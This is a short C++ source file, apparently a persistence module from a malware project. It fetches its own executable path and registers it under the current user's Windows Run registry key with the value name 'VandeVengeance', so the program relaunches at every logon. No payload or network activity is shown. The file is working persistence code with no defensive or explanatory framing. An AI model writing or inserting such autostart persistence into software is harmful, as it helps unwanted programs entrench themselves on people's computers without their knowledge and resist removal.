#include <persistence.h>

bool getPath(wchar_t* exePath, DWORD bufferSize) {
    DWORD rv = GetModuleFileNameW(NULL, exePath, bufferSize);

    if (rv == 0 || rv > bufferSize) {
        return false;
    }

    return true;
}

bool WriteRegistryRun(wchar_t* path) {
    HKEY hKey;
    LONG rv;
    
    rv = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );

    if (rv != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open/create registry key. Error code: " << rv << std::endl;
        return false;
    }

    DWORD strSize = (lstrlenW(path) + 1) * sizeof(wchar_t);
    rv = RegSetValueExW(
        hKey,
        L"VandeVengeance",
        0,
        REG_SZ,
        (BYTE*) path,
        strSize
    );

    if (rv != ERROR_SUCCESS) {
        std::wcerr << L"Failed to write str value. Error code: " << rv << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}